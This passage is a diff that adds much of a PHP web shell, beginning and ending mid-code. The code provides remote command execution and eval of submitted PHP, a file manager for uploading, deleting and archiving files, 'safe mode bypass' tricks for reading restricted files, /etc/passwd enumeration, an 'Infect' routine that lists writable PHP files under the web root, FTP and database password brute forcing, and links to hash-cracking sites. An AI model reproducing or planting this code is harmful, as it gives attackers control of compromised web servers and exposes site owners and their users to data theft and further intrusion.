+        cur--; 
+        if(cur>=0) 
+            document.cf.cmd.value = cmds[cur]; 
+        else 
+            cur++; 
+    } else if(n == 40) { 
+        cur++; 
+        if(cur < cmds.length) 
+            document.cf.cmd.value = cmds[cur]; 
+        else 
+            cur--; 
+    } 
+} 
+function add(cmd) { 
+    cmds.pop(); 
+    cmds.push(cmd); 
+    cmds.push(''); 
+    cur = cmds.length-1; 
+} 
+</script>"; 
+    echo '<h1>Console</h1><div class=content><form name=cf onsubmit="if(d.cf.cmd.value==\'clear\'){d.cf.output.value=\'\';d.cf.cmd.value=\'\';return false;}add(this.cmd.value);if(this.ajax.checked){a(null,null,this.cmd.value,this.show_errors.checked?1:\'\');}else{g(null,null,this.cmd.value,this.show_errors.checked?1:\'\');} return false;"><label><select name=alias>'; 
+    foreach($GLOBALS['aliases'] as $n => $v) { 
+        if($v == '') { 
+            echo '<optgroup label="-'.htmlspecialchars($n).'-"></optgroup>'; 
+            continue; 
+        } 
+        echo '<option value="'.htmlspecialchars($v).'">'.$n.'</option>'; 
+    } 
+     
+    echo '</select></label><input type=button onclick="add(d.cf.alias.value);if(d.cf.ajax.checked){a(null,null,d.cf.alias.value,d.cf.show_errors.checked?1:\'\');}else{g(null,null,d.cf.alias.value,d.cf.show_errors.checked?1:\'\');}" value="submit"> <nobr><input type=checkbox name=ajax value=1 '.(@$_COOKIE[md5($_SERVER['HTTP_HOST']).'ajax']?'checked':'').'> send using AJAX <input type=checkbox name=show_errors value=1 '.(!empty($_POST['p2'])||$_COOKIE[md5($_SERVER['HTTP_HOST']).'stderr_to_out']?'checked':'').'> redirect stderr to stdout (2>&1)</nobr><br/><textarea class=bigarea name=output style="border-bottom:0;margin-top:5px;" readonly>'; 
+    if(!empty($_POST['p1'])) { 
+        echo htmlspecialchars("$ ".$_POST['p1']."\n".ex($_POST['p1'])); 
+    } 
+    echo '</textarea><table style="border:1px solid #060a10;background-color:#060a10;border-top:0px;" cellpadding=0 cellspacing=0 width="100%"><tr><td style="padding-left:4px; width:13px;">$</td><td><input type=text name=cmd style="border:0px;width:100%;" onkeydown="kp(event);"></td></tr></table>'; 
+    echo '</form></div><script>d.cf.cmd.focus();</script>'; 
+    hardFooter(); 
+} 
+function actionPhp() { 
+    if( isset($_POST['ajax']) ) { 
+        $_COOKIE[md5($_SERVER['HTTP_HOST']).'ajax'] = true; 
+        ob_start(); 
+        eval($_POST['p1']); 
+        $temp = "document.getElementById('PhpOutput').style.display='';document.getElementById('PhpOutput').innerHTML='".addcslashes(htmlspecialchars(ob_get_clean()),"\n\r\t\\'\0")."';\n"; 
+        echo strlen($temp), "\n", $temp; 
+        exit;  
+    } 
+    hardHeader(); 
+    if( isset($_POST['p2']) && ($_POST['p2'] == 'info') ) { 
+        echo '<h1>PHP info</h1><div class=content>'; 
+        ob_start(); 
+        phpinfo(); 
+        $tmp = ob_get_clean(); 
+        $tmp = preg_replace('!body {.*}!msiU','',$tmp); 
+        $tmp = preg_replace('!a:\w+ {.*}!msiU','',$tmp); 
+        $tmp = preg_replace('!h1!msiU','h2',$tmp); 
+        $tmp = preg_replace('!td, th {(.*)}!msiU','.e, .v, .h, .h th {$1}',$tmp); 
+        $tmp = preg_replace('!body, td, th, h2, h2 {.*}!msiU','',$tmp); 
+        echo $tmp; 
+        echo '</div><br>'; 
+    } 
+    if(empty($_POST['ajax'])&&!empty($_POST['p1'])) 
+        $_COOKIE[md5($_SERVER['HTTP_HOST']).'ajax'] = false; 
+        echo '<h1>Execution PHP-code</h1><div class=content><form name=pf method=post onsubmit="if(this.ajax.checked){a(null,null,this.code.value);}else{g(null,null,this.code.value,\'\');}return false;"><textarea name=code class=bigarea id=PhpCode>'.(!empty($_POST['p1'])?htmlspecialchars($_POST['p1']):'').'</textarea><input type=submit value=Eval style="margin-top:5px">'; 
+    echo ' <input type=checkbox name=ajax value=1 '.($_COOKIE[md5($_SERVER['HTTP_HOST']).'ajax']?'checked':'').'> send using AJAX</form><pre id=PhpOutput style="'.(empty($_POST['p1'])?'display:none;':'').'margin-top:5px;" class=ml1>'; 
+    if(!empty($_POST['p1'])) { 
+        ob_start(); 
+        eval($_POST['p1']); 
+        echo htmlspecialchars(ob_get_clean()); 
+    } 
+    echo '</pre></div>'; 
+    hardFooter(); 
+} 
+function actionFilesMan() { 
+    if (!empty ($_COOKIE['f'])) 
+        $_COOKIE['f'] = @unserialize($_COOKIE['f']); 
+     
+    if(!empty($_POST['p1'])) { 
+        switch($_POST['p1']) { 
+            case 'uploadFile': 
+                if ( is_array($_FILES['f']['tmp_name']) ) { 
+                    foreach ( $_FILES['f']['tmp_name'] as $i => $tmpName ) { 
+                        if(!@move_uploaded_file($tmpName, $_FILES['f']['name'][$i])) { 
+                                echo "Can't upload file!"; 
+                            } 
+                        } 
+                    } 
+                break; 
+            case 'mkdir': 
+                if(!@mkdir($_POST['p2'])) 
+                    echo "Can't create new dir"; 
+                break; 
+            case 'delete': 
+                function deleteDir($path) { 
+                    $path = (substr($path,-1)=='/') ? $path:$path.'/'; 
+                    $dh  = opendir($path); 
+                    while ( ($▟ = readdir($dh) ) !== false) { 
+                        $▟ = $path.$▟; 
+                        if ( (basename($▟) == "..") || (basename($▟) == ".") ) 
+                            continue; 
+                        $type = filetype($▟); 
+                        if ($type == "dir") 
+                            deleteDir($▟); 
+                        else 
+                            @unlink($▟); 
+                    } 
+                    closedir($dh); 
+                    @rmdir($path); 
+                } 
+                if(is_array(@$_POST['f'])) 
+                    foreach($_POST['f'] as $f) { 
+                        if($f == '..') 
+                            continue; 
+                        $f = urldecode($f); 
+                        if(is_dir($f)) 
+                            deleteDir($f); 
+                        else 
+                            @unlink($f); 
+                    } 
+                break; 
+            case 'paste': 
+                if($_COOKIE['act'] == 'copy') { 
+                    function copy_paste($c,$s,$d){ 
+                        if(is_dir($c.$s)){ 
+                            mkdir($d.$s); 
+                            $h = @opendir($c.$s); 
+                            while (($f = @readdir($h)) !== false) 
+                                if (($f != ".") and ($f != "..")) 
+                                    copy_paste($c.$s.'/',$f, $d.$s.'/'); 
+                        } elseif(is_file($c.$s)) 
+                            @copy($c.$s, $d.$s); 
+                    } 
+                    foreach($_COOKIE['f'] as $f) 
+                        copy_paste($_COOKIE['c'],$f, $GLOBALS['cwd']); 
+                } elseif($_COOKIE['act'] == 'move') { 
+                    function move_paste($c,$s,$d){ 
+                        if(is_dir($c.$s)){ 
+                            mkdir($d.$s); 
+                            $h = @opendir($c.$s); 
+                            while (($f = @readdir($h)) !== false) 
+                                if (($f != ".") and ($f != "..")) 
+                                    copy_paste($c.$s.'/',$f, $d.$s.'/'); 
+                        } elseif(@is_file($c.$s)) 
+                            @copy($c.$s, $d.$s); 
+                    } 
+                    foreach($_COOKIE['f'] as $f) 
+                        @rename($_COOKIE['c'].$f, $GLOBALS['cwd'].$f); 
+                } elseif($_COOKIE['act'] == 'zip') { 
+                    if(class_exists('ZipArchive')) { 
+                        $zip = new ZipArchive(); 
+                        if ($zip->open($_POST['p2'], 1)) { 
+                            chdir($_COOKIE['c']); 
+                            foreach($_COOKIE['f'] as $f) { 
+                                if($f == '..') 
+                                    continue; 
+                                if(@is_file($_COOKIE['c'].$f)) 
+                                    $zip->addFile($_COOKIE['c'].$f, $f); 
+                                elseif(@is_dir($_COOKIE['c'].$f)) { 
+                                    $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($f.'/', FilesystemIterator::SKIP_DOTS)); 
+                                    foreach ($iterator as $key=>$value) { 
+                                        $zip->addFile(realpath($key), $key); 
+                                    } 
+                                } 
+                            } 
+                            chdir($GLOBALS['cwd']); 
+                            $zip->close(); 
+                        } 
+                    } 
+                } elseif($_COOKIE['act'] == 'unzip') { 
+                    if(class_exists('ZipArchive')) { 
+                        $zip = new ZipArchive(); 
+                        foreach($_COOKIE['f'] as $f) { 
+                            if($zip->open($_COOKIE['c'].$f)) { 
+                                $zip->extractTo($GLOBALS['cwd']); 
+                                $zip->close(); 
+                            } 
+                        } 
+                    } 
+                } elseif($_COOKIE['act'] == 'tar') { 
+                    chdir($_COOKIE['c']); 
+                    $_COOKIE['f'] = array_map('escapeshellarg', $_COOKIE['f']); 
+                    ex('tar cfzv ' . escapeshellarg($_POST['p2']) . ' ' . implode(' ', $_COOKIE['f'])); 
+                    chdir($GLOBALS['cwd']); 
+                } 
+                unset($_COOKIE['f']); 
+                setcookie('f', '', time() - 3600); 
+                break; 
+            default: 
+                if(!empty($_POST['p1'])) { 
+                    prototype('act', $_POST['p1']); 
+                    prototype('f', serialize(@$_POST['f'])); 
+                    prototype('c', @$_POST['c']); 
+                } 
+                break; 
+        } 
+    } 
+    hardHeader(); 
+    echo '<h1>File manager</h1><div class=content><script>p1_=p2_=p3_="";</script>'; 
+    $dirContent = hardScandir(isset($_POST['c'])?$_POST['c']:$GLOBALS['cwd']); 
+    if($dirContent === false) {    echo 'Can\'t open this folder!';hardFooter(); return; } 
+    global $sort; 
+    $sort = array('name', 1); 
+    if(!empty($_POST['p1'])) { 
+        if(preg_match('!s_([A-z]+)_(\d{1})!', $_POST['p1'], $match)) 
+            $sort = array($match[1], (int)$match[2]); 
+    } 
+echo "<script> 
+    function sa() { 
+        for(i=0;i<d.files.elements.length;i++) 
+            if(d.files.elements[i].type == 'checkbox') 
+                d.files.elements[i].checked = d.files.elements[0].checked; 
+    } 
+</script> 
+<table width='100%' class='main' cellspacing='0' cellpadding='2'> 
+<form name=files method=post><tr><th width='13px'><input type=checkbox onclick='sa()' class=chkbx></th><th><a href='#' onclick='g(\"FilesMan\",null,\"s_name_".($sort[1]?0:1)."\")'>Name</a></th><th><a href='#' onclick='g(\"FilesMan\",null,\"s_size_".($sort[1]?0:1)."\")'>Size</a></th><th><a href='#' onclick='g(\"FilesMan\",null,\"s_modify_".($sort[1]?0:1)."\")'>Modify</a></th><th>Owner/Group</th><th><a href='#' onclick='g(\"FilesMan\",null,\"s_perms_".($sort[1]?0:1)."\")'>Permissions</a></th><th>Actions</th></tr>"; 
+    $dirs = $files = array(); 
+    $n = count($dirContent); 
+    for($i=0;$i<$n;$i++) { 
+        $ow = @posix_getpwuid(@fileowner($dirContent[$i])); 
+        $gr = @posix_getgrgid(@filegroup($dirContent[$i])); 
+        $tmp = array('name' => $dirContent[$i], 
+                     'path' => $GLOBALS['cwd'].$dirContent[$i], 
+                     'modify' => date('Y-m-d H:i:s', @filemtime($GLOBALS['cwd'] . $dirContent[$i])), 
+                     'perms' => viewPermsColor($GLOBALS['cwd'] . $dirContent[$i]), 
+                     'size' => @filesize($GLOBALS['cwd'].$dirContent[$i]), 
+                     'owner' => $ow['name']?$ow['name']:@fileowner($dirContent[$i]), 
+                     'group' => $gr['name']?$gr['name']:@filegroup($dirContent[$i]) 
+                    ); 
+        if(@is_file($GLOBALS['cwd'] . $dirContent[$i])) 
+            $files[] = array_merge($tmp, array('type' => 'file')); 
+        elseif(@is_link($GLOBALS['cwd'] . $dirContent[$i])) 
+            $dirs[] = array_merge($tmp, array('type' => 'link', 'link' => readlink($tmp['path']))); 
+        elseif(@is_dir($GLOBALS['cwd'] . $dirContent[$i])&&($dirContent[$i] != ".")) 
+            $dirs[] = array_merge($tmp, array('type' => 'dir')); 
+    } 
+    $GLOBALS['sort'] = $sort; 
+    function cmp($a, $b) { 
+        if($GLOBALS['sort'][0] != 'size') 
+            return strcmp(strtolower($a[$GLOBALS['sort'][0]]), strtolower($b[$GLOBALS['sort'][0]]))*($GLOBALS['sort'][1]?1:-1); 
+        else 
+            return (($a['size'] < $b['size']) ? -1 : 1)*($GLOBALS['sort'][1]?1:-1); 
+    } 
+    usort($files, "cmp"); 
+    usort($dirs, "cmp"); 
+    $files = array_merge($dirs, $files); 
+    $l = 0; 
+    foreach($files as $f) { 
+        echo '<tr'.($l?' class=l1':'').'><td><input type=checkbox name="f[]" value="'.urlencode($f['name']).'" class=chkbx></td><td><a href=# onclick="'.(($f['type']=='file')?'g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'view\')">'.htmlspecialchars($f['name']):'g(\'FilesMan\',\''.$f['path'].'\');" ' . (empty ($f['link']) ? '' : "title='{$f['link']}'") . '><b>[ ' . htmlspecialchars($f['name']) . ' ]</b>').'</a></td><td>'.(($f['type']=='file')?viewSize($f['size']):$f['type']).'</td><td>'.$f['modify'].'</td><td>'.$f['owner'].'/'.$f['group'].'</td><td><a href=# onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\',\'chmod\')">'.$f['perms'] 
+            .'</td><td><a class="tooltip" data-tooltip="Rename" href="#" onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'rename\')">R</a> <a class="tooltip" data-tooltip="Touch" href="#" onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'touch\')">T</a>'.(($f['type']=='file')?' <a class="tooltip" data-tooltip="Frame" href="#" onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'frame\')">F</a> <a class="tooltip" data-tooltip="Edit" href="#" onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'edit\')">E</a> <a class="tooltip" data-tooltip="Download" href="#" onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'download\')">D</a>':'').'</td></tr>'; 
+        $l = $l?0:1; 
+    } 
+    echo "<tr id=fak><td colspan=7> 
+    <input type=hidden name=ne value=''> 
+    <input type=hidden name=a value='FilesMan'> 
+    <input type=hidden name=c value='" . htmlspecialchars($GLOBALS['cwd']) ."'> 
+    <input type=hidden name=charset value='". (isset($_POST['charset'])?$_POST['charset']:'')."'> 
+    <label><select name='p1'>"; 
+    if(!empty($_COOKIE['act']) && @count($_COOKIE['f'])) 
+        echo "<option value='paste'>↳ Paste</option>"; 
+    echo "<option value='copy'>Copy</option><option value='move'>Move</option><option value='delete'>Delete</option>"; 
+    if(class_exists('ZipArchive')) 
+        echo "<option value='zip'>+ zip</option><option value='unzip'>- zip</option>"; 
+    echo "<option value='tar'>+ tar.gz</option>"; 
+    echo "</select></label>"; 
+    if(!empty($_COOKIE['act']) && @count($_COOKIE['f']) && (($_COOKIE['act'] == 'zip') || ($_COOKIE['act'] == 'tar'))) 
+        echo "&nbsp;file name: <input type=text name=p2 value='hard_" . date("Ymd_His") . "." . ($_COOKIE['act'] == 'zip'?'zip':'tar.gz') . "'>&nbsp;"; 
+    echo "<input type='submit' value='submit'></td></tr></form></table></div>"; 
+    hardFooter(); 
+} 
+function actionStringTools() { 
+    if(!function_exists('hex2bin')) {function hex2bin($p) {return decbin(hexdec($p));}} 
+    if(!function_exists('binhex')) {function binhex($p) {return dechex(bindec($p));}} 
+    if(!function_exists('hex2ascii')) {function hex2ascii($p){$r='';for($i=0;$i<strLen($p);$i+=2){$r.=chr(hexdec($p[$i].$p[$i+1]));}return $r;}} 
+    if(!function_exists('ascii2hex')) {function ascii2hex($p){$r='';for($i=0;$i<strlen($p);++$i)$r.= sprintf('%02X',ord($p[$i]));return strtoupper($r);}} 
+    if(!function_exists('full_urlencode')) {function full_urlencode($p){$r='';for($i=0;$i<strlen($p);++$i)$r.= '%'.dechex(ord($p[$i]));return strtoupper($r);}} 
+    $stringTools = array( 
+        'Base64 encode' => 'base64_encode', 
+        'Base64 decode' => 'base64_decode', 
+        'Url encode' => 'urlencode', 
+        'Url decode' => 'urldecode', 
+        'Full urlencode' => 'full_urlencode', 
+        'md5 hash' => 'md5', 
+        'sha1 hash' => 'sha1', 
+        'crypt' => 'crypt', 
+        'CRC32' => 'crc32', 
+        'ASCII to HEX' => 'ascii2hex', 
+        'HEX to ASCII' => 'hex2ascii', 
+        'HEX to DEC' => 'hexdec', 
+        'HEX to BIN' => 'hex2bin', 
+        'DEC to HEX' => 'dechex', 
+        'DEC to BIN' => 'decbin', 
+        'BIN to HEX' => 'binhex', 
+        'BIN to DEC' => 'bindec', 
+        'String to lower case' => 'strtolower', 
+        'String to upper case' => 'strtoupper', 
+        'Htmlspecialchars' => 'htmlspecialchars', 
+        'String length' => 'strlen', 
+    ); 
+    if(isset($_POST['ajax'])) { 
+        prototype(md5($_SERVER['HTTP_HOST']).'ajax', true); 
+        ob_start(); 
+        if(in_array($_POST['p1'], $stringTools)) 
+            echo $_POST['p1']($_POST['p2']); 
+        $temp = "document.getElementById('strOutput').style.display='';document.getElementById('strOutput').innerHTML='".addcslashes(htmlspecialchars(ob_get_clean()),"\n\r\t\\'\0")."';\n"; 
+        echo strlen($temp), "\n", $temp; 
+        exit; 
+    } 
+    if(empty($_POST['ajax'])&&!empty($_POST['p1'])) 
+        prototype(md5($_SERVER['HTTP_HOST']).'ajax', 0); 
+    hardHeader(); 
+    echo '<h1>String conversions</h1><div class=content>'; 
+    echo "<form name='toolsForm' onSubmit='if(this.ajax.checked){a(null,null,this.selectTool.value,this.input.value);}else{g(null,null,this.selectTool.value,this.input.value);} return false;'><label><select name='selectTool'>"; 
+    foreach($stringTools as $k => $v) 
+        echo "<option value='".htmlspecialchars($v)."'>".$k."</option>"; 
+        echo "</select></label><input type='submit' value='submit'/> <input type=checkbox name=ajax value=1 ".(@$_COOKIE[md5($_SERVER['HTTP_HOST']).'ajax']?'checked':'')."> send using AJAX<br><textarea name='input' style='margin-top:5px' class=bigarea>".(empty($_POST['p1'])?'':htmlspecialchars(@$_POST['p2']))."</textarea></form><pre class='ml1' style='".(empty($_POST['p1'])?'display:none;':'')."margin-top:5px' id='strOutput'>"; 
+    if(!empty($_POST['p1'])) { 
+        if(in_array($_POST['p1'], $stringTools))echo htmlspecialchars($_POST['p1']($_POST['p2'])); 
+    } 
+    echo"</pre></div><br><h1>Search files:</h1><div class=content> 
+        <form onsubmit=\"g(null,this.cwd.value,null,this.text.value,this.filename.value);return false;\"><table cellpadding='1' cellspacing='0' width='50%'> 
+            <tr><td width='1%'>Text:</td><td><input type='text' name='text' style='width:100%'></td></tr> 
+            <tr><td>Path:</td><td><input type='text' name='cwd' value='". htmlspecialchars($GLOBALS['cwd']) ."' style='width:100%'></td></tr> 
+            <tr><td>Name:</td><td><input type='text' name='filename' value='*' style='width:100%'></td></tr> 
+            <tr><td></td><td><input type='submit' value='submit'></td></tr> 
+            </table></form>"; 
+    function hardRecursiveGlob($path) { 
+        if(substr($path, -1) != '/') 
+            $path.='/'; 
+        $paths = @array_unique(@array_merge(@glob($path.$_POST['p3']), @glob($path.'*', GLOB_ONLYDIR))); 
+        if(is_array($paths)&&@count($paths)) { 
+            foreach($paths as $▟) { 
+                if(@is_dir($▟)){ 
+                    if($path!=$▟) 
+                        hardRecursiveGlob($▟); 
+                } else { 
+                    if(empty($_POST['p2']) || @strpos(file_get_contents($▟), $_POST['p2'])!==false) 
+                        echo "<a href='#' onclick='g(\"FilesTools\",null,\"".urlencode($▟)."\", \"view\",\"\")'>".htmlspecialchars($▟)."</a><br>"; 
+                } 
+            } 
+        } 
+    } 
+    if(@$_POST['p3']) 
+        hardRecursiveGlob($_POST['c']); 
+    echo "</div><br><h1>Search for hash:</h1><div class=content> 
+        <form method='post' target='_blank' name='hf'> 
+            <input type='text' name='hash' style='width:200px;'><br> 
+            <input type='hidden' name='act' value='find'/> 
+            <input type='submit' value='hashcracking.ru' onclick=\"document.hf.action='https://hashcracking.ru/index.php';document.hf.submit()\"><br> 
+            <input type='submit' value='md5.rednoize.com' onclick=\"document.hf.action='http://md5.rednoize.com/?q='+document.hf.hash.value+'&s=md5';document.hf.submit()\"><br> 
+            <input type='submit' value='fakenamegenerator.com' onclick=\"document.hf.action='http://www.fakenamegenerator.com/';document.hf.submit()\"><br> 
+            <input type='submit' value='hashcrack.com' onclick=\"document.hf.action='http://www.hashcrack.com/index.php';document.hf.submit()\"><br> 
+            <input type='submit' value='toolki.com' onclick=\"document.hf.action='http://toolki.com/';document.hf.submit()\"><br> 
+            <input type='submit' value='fopo.com.ar' onclick=\"document.hf.action='http://fopo.com.ar/';document.hf.submit()\"><br> 
+            <input type='submit' value='md5decrypter.com' onclick=\"document.hf.action='http://www.md5decrypter.com/';document.hf.submit()\"><br> 
+        </form></div>"; 
+    hardFooter(); 
+} 
+function actionSafeMode() { 
+    $temp=''; 
+    ob_start(); 
+    switch($_POST['p1']) { 
+        case 1: 
+            $temp=@tempnam($test, 'cx'); 
+            if(@copy("compress.zlib://".$_POST['p2'], $temp)){ 
+                echo @file_get_contents($temp); 
+                unlink($temp); 
+            } else 
+                echo 'Sorry... Can\'t open file'; 
+            break; 
+        case 2: 
+            $files = glob($_POST['p2'].'*'); 
+            if( is_array($files) ) 
+                foreach ($files as $filename) 
+                    echo $filename."\n"; 
+            break; 
+        case 3: 
+            $ch = curl_init("file://".$_POST['p2']."\x00".SELF_PATH); 
+            curl_exec($ch); 
+            break; 
+        case 4: 
+            ini_restore("safe_mode"); 
+            ini_restore("open_basedir"); 
+            include($_POST['p2']); 
+            break; 
+        case 5: 
+            for(;$_POST['p2'] <= $_POST['p3'];$_POST['p2']++) { 
+                $uid = @posix_getpwuid($_POST['p2']); 
+                if ($uid) 
+                    echo join(':',$uid)."\n"; 
+            } 
+            break; 
+        case 6: 
+            if(!function_exists('imap_open'))break; 
+            $stream = imap_open($_POST['p2'], "", ""); 
+            if ($stream == FALSE) 
+                break; 
+            echo imap_body($stream, 1); 
+            imap_close($stream); 
+            break; 
+    } 
+    $temp = ob_get_clean(); 
+    hardHeader(); 
+    echo '<h1>Safe mode bypass</h1><div class=content>'; 
+    echo '<span>Copy (read file)</span><form onsubmit=\'g(null,null,"1",this.param.value);return false;\'><input class="toolsInp" type=text name=param><input type=submit value="submit"></form><br><span>Glob (list dir)</span><form onsubmit=\'g(null,null,"2",this.param.value);return false;\'><input class="toolsInp" type=text name=param><input type=submit value="submit"></form><br><span>Curl (read file)</span><form onsubmit=\'g(null,null,"3",this.param.value);return false;\'><input class="toolsInp" type=text name=param><input type=submit value="submit"></form><br><span>Ini_restore (read file)</span><form onsubmit=\'g(null,null,"4",this.param.value);return false;\'><input class="toolsInp" type=text name=param><input type=submit value="submit"></form><br><span>Posix_getpwuid ("Read" /etc/passwd)</span><table><form onsubmit=\'g(null,null,"5",this.param1.value,this.param2.value);return false;\'><tr><td>From</td><td><input type=text name=param1 value=0></td></tr><tr><td>To</td><td><input type=text name=param2 value=1000></td></tr></table><input type=submit value="submit"></form><br><br><span>Imap_open (read file)</span><form onsubmit=\'g(null,null,"6",this.param.value);return false;\'><input type=text name=param><input type=submit value="submit"></form>'; 
+    if($temp) 
+        echo '<pre class="ml1" style="margin-top:5px" id="Output">'.$temp.'</pre>'; 
+    echo '</div>'; 
+    hardFooter(); 
+} 
+function actionLogout() { 
+    setcookie(md5($_SERVER['HTTP_HOST']), '', time() - 3600); 
+    die('bye!'); 
+} 
+function actionSelfRemove() { 
+    if($_POST['p1'] == 'yes') 
+        if(@unlink(preg_replace('!\(\d+\)\s.*!', '', __FILE__))) 
+            die('Shell has been removed'); 
+        else 
+            echo 'unlink error!'; 
+    if($_POST['p1'] != 'yes') 
+        hardHeader(); 
+    echo '<h1>Suicide</h1><div class=content>Really want to remove the shell?<br><a href=# onclick="g(null,null,\'yes\')">Yes</a></div>'; 
+    hardFooter(); 
+} 
+function actionInfect() { 
+    hardHeader(); 
+    echo '<h1>Infect</h1><div class=content>'; 
+    if($_POST['p1'] == 'infect') { 
+        $target=$_SERVER['DOCUMENT_ROOT']; 
+            function ListFiles($dir) { 
+                if($dh = opendir($dir)) { 
+                    $files = Array(); 
+                    $inner_files = Array(); 
+                    while($file = readdir($dh)) { 
+                        if($file != "." && $file != "..") { 
+                            if(is_dir($dir . "/" . $file)) { 
+                                $inner_files = ListFiles($dir . "/" . $file); 
+                                if(is_array($inner_files)) $files = array_merge($files, $inner_files);  
+                            } else { 
+                                array_push($files, $dir . "/" . $file); 
+                            } 
+                        } 
+                    } 
+                    closedir($dh); 
+                    return $files; 
+                } 
+            } 
+            foreach (ListFiles($target) as $key=>$file){ 
+                $nFile = substr($file, -4, 4); 
+                if($nFile == ".php" ){ 
+                    if(($file<>$_SERVER['DOCUMENT_ROOT'].$_SERVER['PHP_SELF'])&&(is_writeable($file))){ 
+                        echo "$file<br>"; 
+                        $i++; 
+                    } 
+                } 
+            } 
+            echo "<font color=red size=14>$i</font>"; 
+        }else{ 
+            echo "<form method=post><input type=submit value=Infect name=infet></form>"; 
+            echo 'Really want to infect the server?&nbsp;<a href=# onclick="g(null,null,\'infect\')">Yes</a></div>'; 
+        } 
+    hardFooter(); 
+} 
+function actionBruteforce() { 
+    hardHeader(); 
+    if( isset($_POST['proto']) ) { 
+        echo '<h1>Results</h1><div class=content><span>Type:</span> '.htmlspecialchars($_POST['proto']).' <span>Server:</span> '.htmlspecialchars($_POST['server']).'<br>'; 
+        if( $_POST['proto'] == 'ftp' ) { 
+            function bruteForce($ip,$port,$login,$pass) { 
+                $fp = @ftp_connect($ip, $port?$port:21); 
+                if(!$fp) return false; 
+                $res = @ftp_login($fp, $login, $pass); 
+                @ftp_close($fp); 
+                return $res; 
+            } 
+        } elseif( $_POST['proto'] == 'mysql' ) { 
+            function bruteForce($ip,$port,$login,$pass) { 
+                $res = @mysql_connect($ip.':'.($port?$port:3306), $login, $pass); 
+                @mysql_close($res); 
+                return $res; 
+            } 
+        } elseif( $_POST['proto'] == 'pgsql' ) { 
+            function bruteForce($ip,$port,$login,$pass) { 
+                $str = "host='".$ip."' port='".$port."' user='".$login."' password='".$pass."' dbname=postgres"; 
+                $res = @pg_connect($str); 
+                @pg_close($res); 
+                return $res; 
+            } 
+        } 
+        $success = 0; 
+        $attempts = 0; 
+        $server = explode(":", $_POST['server']); 
+        if($_POST['type'] == 1) { 
+            $temp = @file('/etc/passwd'); 
+            if( is_array($temp) ) 
+                foreach($temp as $line) { 
+                    $line = explode(":", $line); 
+                    ++$attempts; 
+                    if( bruteForce(@$server[0],@$server[1], $line[0], $line[0]) ) { 
+                        $success++; 
+                        echo '<b>'.htmlspecialchars($line[0]).'</b>:'.htmlspecialchars($line[0]).'<br>'; 
+                    } 
+                    if(@$_POST['reverse']) { 
+                        $tmp = ""; 
+                        for($i=strlen($line[0])-1; $i>=0; --$i) 
+                            $tmp .= $line[0][$i]; 
+                        ++$attempts; 
+                        if( bruteForce(@$server[0],@$server[1], $line[0], $tmp) ) { 
+                            $success++; 
+                            echo '<b>'.htmlspecialchars($line[0]).'</b>:'.htmlspecialchars($tmp); 
+                        } 
+                    } 
+                } 
+        } elseif($_POST['type'] == 2) { 
+            $temp = @file($_POST['dict']); 
+            if( is_array($temp) ) 
+                foreach($temp as $line) { 
+                    $line = trim($line); 
+                    ++$attempts; 
+                    if( bruteForce($server[0],@$server[1], $_POST['login'], $line) ) { 
+                        $success++; 
+                        echo '<b>'.htmlspecialchars($_POST['login']).'</b>:'.htmlspecialchars($line).'<br>'; 
+                    } 
+                } 
+        } 
+        echo "<span>Attempts:</span> $attempts <span>Success:</span> $success</div><br>"; 
+    } 
+    echo '<h1>FTP bruteforce</h1><div class=content><table><form method=post><tr><td><span>Type</span></td>' 
+        .'<td><label><select name=proto><option value=ftp>FTP</option><option value=mysql>MySql</option><option value=pgsql>PostgreSql</option></select></label></td></tr><tr><td>' 
+        .'<input type=hidden name=c value="'.htmlspecialchars($GLOBALS['cwd']).'">' 
+        .'<input type=hidden name=a value="'.htmlspecialchars($_POST['a']).'">' 
+        .'<input type=hidden name=charset value="'.htmlspecialchars($_POST['charset']).'">' 
+        .'<input type=hidden name=ne  value="">' 
+        .'<span>Server:port</span></td>' 
+        .'<td><input type=text name=server value="127.0.0.1"></td></tr>' 
+        .'<tr><td><span>Brute type</span></td>' 
+        .'<td><input type=radio name=type value="1" checked> /etc/passwd</td></tr>' 
+        .'<tr><td></td><td style="padding-left:15px"><input type=checkbox name=reverse value=1 checked> reverse (login -> nigol)</td></tr>' 
+        .'<tr><td></td><td><input type=radio name=type value="2"> Dictionary</td></tr>' 
+        .'<tr><td></td><td><table style="padding-left:15px"><tr><td><span>Login</span></td>' 
+        .'<td><input type=text name=login value="root"></td></tr>' 
+        .'<tr><td><span>Dictionary</span></td>' 
+        .'<td><input type=text name=dict value="'.htmlspecialchars($GLOBALS['cwd']).'passwd.dic"></td></tr></table>' 
+        .'</td></tr><tr><td></td><td><input type=submit value="submit"></td></tr></form></table>'; 
+    echo '</div>'; 
+    hardFooter(); 
+} 
+function actionSql() { 
+    class DbClass { 
+        var $type; 
+        var $link; 
+        var $res; 
+        function DbClass($type)    { 
+            $this->type = $type; 
+        } 
+        function connect($host, $user, $pass, $dbname){ 
+            switch($this->type)    { 
+                case 'mysql': 
+                    if( $this->link = @mysql_connect($host,$user,$pass,true) ) return true; 
+                    break; 
+                case 'pgsql': 
+                    $host = explode(':', $host); 
+                    if(!$host[1]) $host[1]=5432; 
+                    if( $this->link = @pg_connect("host={$host[0]} port={$host[1]} user=$user password=$pass dbname=$dbname") ) return true; 
+                    break; 
+            } 
+            return false; 
+        } 
+        function selectdb($db) { 
+            switch($this->type)    { 
+                case 'mysql': 
+                    if (@mysql_select_db($db))return true; 
+                    break; 
+            } 
+            return false; 
+        } 
+        function query($str) { 
+            switch($this->type) { 
+                case 'mysql': 
+                    return $this->res = @mysql_query($str); 
+                    break; 
+                case 'pgsql': 
+                    return $this->res = @pg_query($this->link,$str); 
+                    break; 
+            } 
+            return false; 
+        } 
+        function fetch() { 
+            $res = func_num_args()?func_get_arg(0):$this->res; 
+            switch($this->type)    { 
+                case 'mysql': 
+                    return @mysql_fetch_assoc($res); 
+                    break; 
+                case 'pgsql': 
+                    return @pg_fetch_assoc($res); 
+                    break; 
+            } 
+            return false; 
+        } 
+        function listDbs() { 
+            switch($this->type)    { 
+                case 'mysql': 
+                        return $this->query("SHOW databases"); 
+                break; 
+                case 'pgsql': 
